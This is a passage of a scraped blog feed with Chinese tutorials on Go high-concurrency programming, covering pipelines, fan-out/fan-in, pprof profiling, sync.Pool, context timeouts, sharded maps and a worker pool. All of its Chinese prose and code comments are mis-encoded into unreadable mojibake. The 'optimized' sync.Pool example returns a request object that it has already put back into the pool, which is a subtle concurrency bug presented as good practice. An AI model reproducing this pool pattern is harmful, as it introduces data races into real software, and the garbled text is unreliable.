    stage1 := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(in &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> {
        out := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">100</span>)
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
            <span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(out)
            <span class="hljs-keyword">for</span> n := <span class="hljs-keyword">range</span> in {
                out &lt;- n * n
            }
        }()
        <span class="hljs-keyword">return</span> out
    }
    
    <span class="hljs-comment">// ç¬¬äºŒé˜¶æ®µï¼šè¿‡æ»¤å¥‡æ•°</span>
    stage2 := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(in &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> {
        out := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">100</span>)
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
            <span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(out)
            <span class="hljs-keyword">for</span> n := <span class="hljs-keyword">range</span> in {
                <span class="hljs-keyword">if</span> n%<span class="hljs-number">2</span> == <span class="hljs-number">0</span> {
                    out &lt;- n
                }
            }
        }()
        <span class="hljs-keyword">return</span> out
    }
    
    <span class="hljs-comment">// ç¬¬ä¸‰é˜¶æ®µï¼šè½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>
    stage3 := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(in &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span> {
        out := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>, <span class="hljs-number">100</span>)
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
            <span class="hljs-keyword">defer</span> <span class="hljs-built_in">close</span>(out)
            <span class="hljs-keyword">for</span> n := <span class="hljs-keyword">range</span> in {
                out &lt;- fmt.Sprintf(<span class="hljs-string">"&gt;&gt;%d&lt;&lt;"</span>, n)
            }
        }()
        <span class="hljs-keyword">return</span> out
    }
    
    <span class="hljs-keyword">return</span> stage3(stage2(stage1(input)))
}
</code></pre>
<h3 data-id="heading-9">2. Fan-out/Fan-inæ¨¡å¼</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åˆ†å¸ƒå¼å¤„ç†æ¨¡å¼å®ç°</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processInParallel</span><span class="hljs-params">(tasks []Task, workers <span class="hljs-type">int</span>)</span></span> []Result {
    taskCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Task)
    resultCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Result)
    
    <span class="hljs-comment">// Fan-out: åˆ†å‘ä»»åŠ¡åˆ°å¤šä¸ªworker</span>
    <span class="hljs-keyword">var</span> wg sync.WaitGroup
    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; workers; i++ {
        wg.Add(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
            <span class="hljs-keyword">defer</span> wg.Done()
            <span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> taskCh {
                resultCh &lt;- process(task)
            }
        }()
    }
    
    <span class="hljs-comment">// æ”¶é›†ç»“æœçš„goroutine</span>
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        wg.Wait()
        <span class="hljs-built_in">close</span>(resultCh)
    }()
    
    <span class="hljs-comment">// å‘é€ä»»åŠ¡</span>
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">for</span> _, task := <span class="hljs-keyword">range</span> tasks {
            taskCh &lt;- task
        }
        <span class="hljs-built_in">close</span>(taskCh)
    }()
    
    <span class="hljs-comment">// Fan-in: æ”¶é›†ç»“æœ</span>
    <span class="hljs-keyword">var</span> results []Result
    <span class="hljs-keyword">for</span> res := <span class="hljs-keyword">range</span> resultCh {
        results = <span class="hljs-built_in">append</span>(results, res)
    }
    <span class="hljs-keyword">return</span> results
}
</code></pre>
<h2 data-id="heading-10">å››ã€æ€§èƒ½åˆ†æä¸ä¼˜åŒ–æŠ€å·§</h2>
<h3 data-id="heading-11">1. pprofå®æˆ˜åˆ†æ</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// åœ¨mainå‡½æ•°ä¸­å¯ç”¨pprof</span>
<span class="hljs-keyword">import</span> _ <span class="hljs-string">"net/http/pprof"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        log.Println(http.ListenAndServe(<span class="hljs-string">"localhost:6060"</span>, <span class="hljs-literal">nil</span>))
    }()
    
    <span class="hljs-comment">// ... åº”ç”¨ä¸»é€»è¾‘</span>
}

<span class="hljs-comment">/* å¸¸ç”¨pprofå‘½ä»¤ï¼š
1. è·å–30ç§’CPU profile:
   go tool pprof http://localhost:6060/debug/pprof/profile?seconds=30

2. è·å–å †å†…å­˜åˆ†æ:
   go tool pprof http://localhost:6060/debug/pprof/heap

3. æŸ¥çœ‹goroutineé˜»å¡åˆ†æ:
   go tool pprof http://localhost:6060/debug/pprof/block

4. ç”Ÿæˆç«ç„°å›¾:
   go tool pprof -http=:8080 profile.out
*/</span>
</code></pre>
<h3 data-id="heading-12">2. å…³é”®æ€§èƒ½ä¼˜åŒ–æ¡ˆä¾‹</h3>
<p><strong>å­—ç¬¦ä¸²æ‹¼æ¥ä¼˜åŒ–ï¼š</strong></p>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ä½æ•ˆæ–¹å¼</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">buildStringSlow</span><span class="hljs-params">(parts []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
    <span class="hljs-keyword">var</span> s <span class="hljs-type">string</span>
    <span class="hljs-keyword">for</span> _, part := <span class="hljs-keyword">range</span> parts {
        s += part
    }
    <span class="hljs-keyword">return</span> s
}

<span class="hljs-comment">// é«˜æ•ˆæ–¹å¼</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">buildStringFast</span><span class="hljs-params">(parts []<span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
    <span class="hljs-keyword">var</span> builder strings.Builder
    builder.Grow(<span class="hljs-built_in">len</span>(parts) * <span class="hljs-number">10</span>) <span class="hljs-comment">// é¢„åˆ†é…å®¹é‡</span>
    <span class="hljs-keyword">for</span> _, part := <span class="hljs-keyword">range</span> parts {
        builder.WriteString(part)
    }
    <span class="hljs-keyword">return</span> builder.String()
}
</code></pre>
<p><strong>å‡å°‘å†…å­˜åˆ†é…ï¼š</strong></p>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ä¼˜åŒ–å‰ï¼šæ¯æ¬¡è°ƒç”¨éƒ½åˆ›å»ºæ–°å¯¹è±¡</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">parseRequest</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> (Request, <span class="hljs-type">error</span>) {
    <span class="hljs-keyword">var</span> req Request
    <span class="hljs-keyword">if</span> err := json.Unmarshal(data, &amp;req); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> Request{}, err
    }
    <span class="hljs-keyword">return</span> req, <span class="hljs-literal">nil</span>
}

<span class="hljs-comment">// ä¼˜åŒ–åï¼šå¤ç”¨å¯¹è±¡</span>
<span class="hljs-keyword">var</span> requestPool = sync.Pool{
    New: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-keyword">interface</span>{} { <span class="hljs-keyword">return</span> <span class="hljs-built_in">new</span>(Request) },
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">parseRequestOptimized</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> (*Request, <span class="hljs-type">error</span>) {
    req := requestPool.Get().(*Request)
    <span class="hljs-keyword">defer</span> requestPool.Put(req)
    
    <span class="hljs-keyword">if</span> err := json.Unmarshal(data, req); err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err
    }
    <span class="hljs-keyword">return</span> req, <span class="hljs-literal">nil</span>
}
</code></pre>
<h2 data-id="heading-13">äº”ã€å¹¶å‘å®‰å…¨æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-14">1. Contextçš„æ­£ç¡®ä½¿ç”¨</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// å¸¦contextçš„goroutineç®¡ç†</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processWithTimeout</span><span class="hljs-params">(ctx context.Context, data []<span class="hljs-type">byte</span>)</span></span> (Result, <span class="hljs-type">error</span>) {
    ctx, cancel := context.WithTimeout(ctx, <span class="hljs-number">2</span>*time.Second)
    <span class="hljs-keyword">defer</span> cancel()
    
    resultCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Result, <span class="hljs-number">1</span>)
    errorCh := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>)
    
    <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
        res, err := heavyProcessing(data)
        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
            errorCh &lt;- err
            <span class="hljs-keyword">return</span>
        }
        resultCh &lt;- res
    }()
    
    <span class="hljs-keyword">select</span> {
    <span class="hljs-keyword">case</span> res := &lt;-resultCh:
        <span class="hljs-keyword">return</span> res, <span class="hljs-literal">nil</span>
    <span class="hljs-keyword">case</span> err := &lt;-errorCh:
        <span class="hljs-keyword">return</span> Result{}, err
    <span class="hljs-keyword">case</span> &lt;-ctx.Done():
        <span class="hljs-keyword">return</span> Result{}, ctx.Err()
    }
}
</code></pre>
<h3 data-id="heading-15">2. Mapçš„å¹¶å‘å®‰å…¨æ–¹æ¡ˆ</h3>
<p>Go</p>
<p><em>î¦Œ</em></p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šsync.Map (é€‚åˆè¯»å¤šå†™å°‘åœºæ™¯)</span>
<span class="hljs-keyword">var</span> m sync.Map

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">syncMapExample</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// å­˜å‚¨</span>
    m.Store(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>)
    
    <span class="hljs-comment">// åŠ è½½</span>
    <span class="hljs-keyword">if</span> v, ok := m.Load(<span class="hljs-string">"key"</span>); ok {
        fmt.Println(v)
    }
    
    <span class="hljs-comment">// åŸå­æ“ä½œ</span>
    m.LoadOrStore(<span class="hljs-string">"newKey"</span>, <span class="hljs-number">42</span>)
}

<span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šåˆ†ç‰‡é” (é€‚åˆå†™å¤šåœºæ™¯)</span>
<span class="hljs-keyword">type</span> ShardedMap <span class="hljs-keyword">struct</span> {
    shards []*shard
}

<span class="hljs-keyword">type</span> shard <span class="hljs-keyword">struct</span> {
    items <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}
    sync.RWMutex
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewShardedMap</span><span class="hljs-params">(shardCount <span class="hljs-type">int</span>)</span></span> *ShardedMap {
    shards := <span class="hljs-built_in">make</span>([]*shard, shardCount)
    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; shardCount; i++ {
        shards[i] = &amp;shard{
            items: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">interface</span>{}),
        }
    }
    <span class="hljs-keyword">return</span> &amp;ShardedMap{shards: shards}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *ShardedMap)</span></span> getShard(key <span class="hljs-type">string</span>) *shard {
    h := fnv.New32()
    h.Write([]<span class="hljs-type">byte</span>(key))
    <span class="hljs-keyword">return</span> m.shards[h.Sum32()%<span class="hljs-type">uint32</span>(<span class="hljs-built_in">len</span>(m.shards))]
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(m *ShardedMap)</span></span> Set(key <span class="hljs-type">string</span>, value <span class="hljs-keyword">interface</span>{}) {
    shard := m.getShard(key)
    shard.Lock()
    shard.items[key] = value
    shard.Unlock()
}
</code></pre>
<h2 data-id="heading-16">ç»“è¯­ï¼šé«˜å¹¶å‘ç³»ç»Ÿçš„è®¾è®¡å“²å­¦</h2>
<p>é€šè¿‡Goè¿›é˜¶è¥çš„å®è·µï¼Œæˆ‘æ€»ç»“äº†é«˜å¹¶å‘ç¼–ç¨‹çš„ä¸‰ä¸ªæ ¸å¿ƒåŸåˆ™ï¼š</p>
<ol>
<li><strong>è½»é‡çº§åŸåˆ™</strong>ï¼šGoroutineè¦è½»é‡ï¼Œé¿å…åœ¨goroutineä¸­å¤„ç†é‡é€»è¾‘</li>
<li><strong>æ— å…±äº«åŸåˆ™</strong>ï¼šå°½å¯èƒ½é€šè¿‡channelé€šä¿¡è€Œä¸æ˜¯å…±äº«å†…å­˜</li>
<li><strong>å¼¹æ€§åŸåˆ™</strong>ï¼šç³»ç»Ÿè¦èƒ½æ ¹æ®è´Ÿè½½è‡ªåŠ¨æ‰©å±•å’Œæ”¶ç¼©</li>
</ol>
<p>å®é™…é¡¹ç›®ä¸­è¿˜éœ€è¦æ³¨æ„ï¼š</p>
<ul>
<li>åˆç†è®¾ç½®GOMAXPROCSï¼ˆç‰¹åˆ«æ˜¯å®¹å™¨ç¯å¢ƒï¼‰</li>
<li>ç›‘æ§å…³é”®æŒ‡æ ‡ï¼šgoroutineæ•°é‡ã€GCé¢‘ç‡ã€å†…å­˜åˆ†é…ç­‰</li>
<li>æ¸è¿›å¼ä¼˜åŒ–ï¼šå…ˆä¿è¯æ­£ç¡®æ€§ï¼Œå†è€ƒè™‘æ€§èƒ½ä¼˜åŒ–</li>
</ul>
<p>æœ€ååˆ†äº«ä¸€ä¸ªæ€§èƒ½ä¼˜åŒ–æ£€æŸ¥æ¸…å•ï¼š</p>
<ol>
<li>Â æ˜¯å¦é¿å…äº†ä¸å¿…è¦çš„å†…å­˜åˆ†é…ï¼Ÿ</li>
<li>Â æ˜¯å¦åˆç†ä½¿ç”¨äº†sync.Poolï¼Ÿ</li>
<li>Â é”ç²’åº¦æ˜¯å¦å¯ä»¥æ›´ç»†ï¼Ÿ</li>
<li>Â æ˜¯å¦æœ‰goroutineæ³„æ¼é£é™©ï¼Ÿ</li>
<li>Â æ˜¯å¦å……åˆ†åˆ©ç”¨äº†CPUå¤šæ ¸èƒ½åŠ›ï¼Ÿ</li>
</ol>
<p>å¸Œæœ›è¿™äº›å®æˆ˜ç»éªŒèƒ½å¸®åŠ©ä½ åœ¨Goé«˜å¹¶å‘ç¼–ç¨‹é“è·¯ä¸Šæ›´è¿›ä¸€æ­¥ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7588704463621062675</link>    <guid>https://juejin.cn/post/7588704463621062675</guid>    <pubDate>2025-12-29T07:12:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588704463621062675" data-draft-id="7589126217234104326" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯ "/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-29T07:12:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·156584592505"/> <meta itemprop="url" content="https://juejin.cn/user/3950970778687033"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3950970778687033/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·156584592505
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T07:12:14.000Z" title="Mon Dec 29 2025 07:12:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>GoæŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡ï¼Œå¼€å¯GoæŠ€æœ¯ä¸“å®¶ä¹‹è·¯---xingkeit.top/15564/</strong></p>
<p>ä½œä¸ºä¸€ååœ¨æŠ€æœ¯ä¸€çº¿æ‘¸çˆ¬æ»šæ‰“çš„å¼€å‘è€…ï¼Œå›é¡¾ Go è¯­è¨€çš„å­¦ä¹ å†ç¨‹ï¼Œå¾€å¾€æ˜¯ä»Â <code>go run hello.go</code>Â å¼€å§‹ï¼Œä½†çœŸæ­£è¿ˆå‘â€œä¸“å®¶â€çš„é—¨æ§›ï¼Œå´åœ¨äºå¦‚ä½•é©¾é©­é«˜å¹¶å‘åœºæ™¯ä¸‹çš„å¤æ‚ç³»ç»Ÿè®¾è®¡ã€‚æœ€è¿‘å‚åŠ äº† Go æŠ€æœ¯ä¸“å®¶è¿›é˜¶è¥ï¼Œè¿™æ¬¡ç»å†è®©æˆ‘å¯¹ Go çš„ç†è§£ä¸å†å±€é™äºâ€œè¯­æ³•ç³–â€ï¼Œè€Œæ˜¯æ·±å…¥åˆ°äº†åº•å±‚åŸç†ä¸æ¶æ„å“²å­¦ã€‚ä»¥ä¸‹æ˜¯æˆ‘å¯¹ä»ä»£ç å¼€å‘åˆ°æ¶æ„è®¾è®¡æ ¸å¿ƒè·¯å¾„çš„å¹²è´§æç‚¼ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ è¿›é˜¶çš„åŸºçŸ³ï¼šå¹¶å‘ä¸ä»…ä»…æ˜¯ Goroutine</h2>
<p>å¾ˆå¤šåˆçº§å¼€å‘è€…è®¤ä¸º Go çš„å¹¶å‘å°±æ˜¯â€œåŠ ä¸ªÂ <code>go</code>Â å…³é”®å­—â€ã€‚ä½†åœ¨é«˜å¹¶å‘å®æˆ˜ä¸­ï¼Œè£¸ç”¨ Goroutine ææ˜“å¯¼è‡´èµ„æºè€—å°½ç”šè‡³ OOMï¼ˆOut of Memoryï¼‰ã€‚è¿›é˜¶çš„ç¬¬ä¸€æ­¥ï¼Œæ˜¯å­¦ä¼šæ§åˆ¶å¹¶å‘åº¦ä¸åç¨‹çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚</p>
<p>åœ¨æ¶æ„è®¾è®¡ä¸­ï¼Œæˆ‘ä»¬éœ€è¦å¼•å…¥ Worker Poolï¼ˆå·¥ä½œæ± ï¼‰æ¨¡å¼æ¥é™åˆ¶ç³»ç»Ÿå¯¹èµ„æºçš„äº‰æŠ¢ï¼ŒåŒæ—¶åˆ©ç”¨ Context ä¼˜é›…åœ°æ§åˆ¶åç¨‹é€€å‡ºã€‚</p>
<p><strong>å®æˆ˜ä»£ç  1ï¼šå¸¦é™æµä¸ä¼˜é›…é€€å‡ºçš„ Worker Pool</strong></p>
<p>go</p>
<p>å¤åˆ¶</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"context"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"sync"</span>
	<span class="hljs-string">"time"</span>
)

<span class="hljs-comment">// Task å®šä¹‰ä»»åŠ¡ç»“æ„</span>
<span class="hljs-keyword">type</span> Task <span class="hljs-keyword">struct</span> {
	ID <span class="hljs-type">int</span>
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	<span class="hljs-comment">// æ¨¡æ‹Ÿç”Ÿæˆ 100 ä¸ªä»»åŠ¡</span>
	taskCount := <span class="hljs-number">100</span>
	tasks := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> Task, taskCount)
	<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; taskCount; i++ {
		tasks &lt;- Task{ID: i}
	}
	<span class="hljs-built_in">close</span>(tasks)

	<span class="hljs-comment">// ä½¿ç”¨ context å®ç°è¶…æ—¶æ§åˆ¶ä¸ä¼˜é›…é€€å‡º</span>
	ctx, cancel := context.WithTimeout(context.Background(), <span class="hljs-number">5</span>*time.Second)
	<span class="hljs-keyword">defer</span> cancel()

	<span class="hljs-comment">// æ ¸å¿ƒè¿›é˜¶ç‚¹ï¼šæ§åˆ¶å¹¶å‘æ•°ï¼Œé˜²æ­¢æ— é™åˆ›å»º goroutine å¯¼è‡´é›ªå´©</span>
	concurrency := <span class="hljs-number">10</span>
	<span class="hljs-keyword">var</span> wg sync.WaitGroup
	
	<span class="hljs-comment">// å¯åŠ¨å›ºå®šæ•°é‡çš„ Worker</span>
	<span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; concurrency; i++ {
		wg.Add(<span class="hljs-number">1</span>)
		<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(workerID <span class="hljs-type">int</span>)</span></span> {
			<span class="hljs-keyword">defer</span> wg.Done()
			worker(ctx, workerID, tasks)
		}(i)
	}

	<span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ worker å®Œæˆæˆ– context è¶…æ—¶</span>
	done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>{})
